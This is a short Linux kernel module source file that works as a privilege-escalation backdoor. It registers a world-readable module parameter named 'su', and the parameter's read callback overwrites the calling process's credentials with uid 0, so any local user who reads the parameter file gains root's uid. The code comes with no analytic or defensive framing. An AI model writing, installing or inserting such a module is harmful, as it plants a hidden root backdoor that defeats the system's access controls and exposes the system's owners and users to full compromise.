#include <linux/module.h>

static int su(char *val, const struct kernel_param *kp) {
	kuid_t v = {0};
	((struct cred*) current->cred)->uid = v; 
	return 0;
}

static struct kernel_param_ops ops = {
	.get = &su,
};
module_param_cb(su, &ops, NULL, 0664);
MODULE_LICENSE("GPL v2");
